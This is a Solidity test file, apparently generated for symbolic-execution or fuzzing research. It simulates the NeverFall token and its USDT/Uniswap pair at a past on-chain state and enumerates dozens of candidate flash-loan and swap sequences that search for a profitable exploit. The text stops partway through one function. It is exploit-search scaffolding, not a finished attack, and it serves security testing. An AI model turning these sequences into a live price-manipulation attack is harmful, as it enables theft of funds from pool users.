// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {NeverFall} from "./NeverFall.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NeverFallTest is Test, BlockLoader {
    USDT usdt;
    NeverFall neverFall;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address neverFallAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1683045919;
    uint112 reserve0pair = 390749131999675869539950;
    uint112 reserve1pair = 177366502266430132318230923;
    uint32 blockTimestampLastpair = 1683045649;
    uint256 kLastpair = 69305797938101003734510187556035080952127678689650;
    uint256 price0CumulativeLastpair =
        11686512911925420079328798062310345871832946;
    uint256 price1CumulativeLastpair = 38487942699576719668303578652959368015;
    uint256 totalSupplyusdt = 3179997906401637314353419735;
    uint256 balanceOfusdtpair = 390749131999675869539950;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtneverFall = 10920;
    uint256 totalSupplyneverFall = 99900000000000000000000000000;
    uint256 balanceOfneverFallpair = 177366502266430132318230923;
    uint256 balanceOfneverFallattacker = 0;
    uint256 balanceOfneverFallneverFall = 99537303621642211235625620728;
    uint256 totalSupplypair = 8321500927629604090282341;
    uint256 balanceOfpairpair = 0;
    uint256 balanceOfpairattacker = 0;
    uint256 balanceOfpairneverFall = 8320140689525074913430188;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        neverFall = new NeverFall(address(usdt));
        neverFallAddr = address(neverFall);
        pair = new UniswapV2Pair(
            address(usdt),
            address(neverFall),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        pair.special_mint(balanceOfpairneverFall);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(neverFall), balanceOfusdtneverFall);
        neverFall.transfer(address(neverFall), balanceOfneverFallneverFall);
        pair.transfer(address(neverFall), balanceOfpairneverFall);
        usdt.transfer(address(pair), balanceOfusdtpair);
        neverFall.transfer(address(pair), balanceOfneverFallpair);
        neverFall.afterDeploy(address(router), address(pair));
        neverFall.setStartBuy();
        neverFall.transfer(address(neverFall), 99537303621642211235625620728);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(usdt),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(usdt),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Neverfall Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(neverFall),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(neverFall),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(neverFall),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(pair),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(pair),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(attacker),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(attacker),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_neverFall_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        neverFall.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_neverFall_owner(uint256 amount) internal eurus {
        neverFall.transfer(owner, amount);
    }

    function borrow_pair_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        pair.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_owner(uint256 amount) internal eurus {
        pair.transfer(owner, amount);
    }

    function swap_pair_attacker_usdt_neverFall(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_neverFall_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        neverFall.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_neverFall_attacker_usdt_neverFall(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        IERC20(usdt).approve(address(neverFall), type(uint256).max);
        NeverFall(neverFall).buy(amount);
    }

    function swap_neverFall_attacker_neverFall_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        IERC20(usdt).approve(address(neverFall), type(uint256).max);
        NeverFall(neverFall).sell(amount);
    }

    function burn_neverFall_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(
            0,
            pair.getAmountOut(amount, address(usdt)),
            owner,
            new bytes(0)
        );
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_neverFall_attacker_neverFall_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_neverFall_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_neverFall_attacker_usdt_neverFall(amt1, amt2);
        swap_neverFall_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_neverFall_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        payback_neverFall_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        payback_neverFall_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        payback_neverFall_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        payback_neverFall_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        payback_neverFall_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_neverFall_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_neverFall_usdt(amt2, amt3);
        swap_neverFall_attacker_usdt_neverFall(amt4, amt5);
        payback_neverFall_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_pair_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        payback_neverFall_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        payback_neverFall_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_usdt_neverFall(amt4, amt5);
        payback_neverFall_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_pair_attacker_usdt_neverFall(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        payback_neverFall_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        payback_neverFall_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_neverFall_owner(amt0);
        swap_neverFall_attacker_neverFall_usdt(amt1, amt2);
        swap_neverFall_attacker_usdt_neverFall(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        payback_neverFall_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        swap_neverFall_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_pair_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        burn_neverFall_pair(amt5);
        swap_pair_attacker_usdt_neverFall(amt6, amt7);
        swap_neverFall_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        burn_neverFall_pair(amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        burn_neverFall_pair(amt7);
        swap_pair_attacker_neverFall_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_pair_attacker_neverFall_usdt(amt7, amt8);
        swap_neverFall_attacker_neverFall_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_neverFall(amt1, amt2);
        swap_pair_attacker_neverFall_usdt(amt3, amt4);
        swap_neverFall_attacker_usdt_neverFall(amt5, amt6);
        swap_neverFall_attacker_neverFall_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_neverFall_pair(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        swap_pair_attacker_neverFall_usdt(amt4, amt5);
        swap_neverFall_attacker_usdt_neverFall(amt6, amt7);
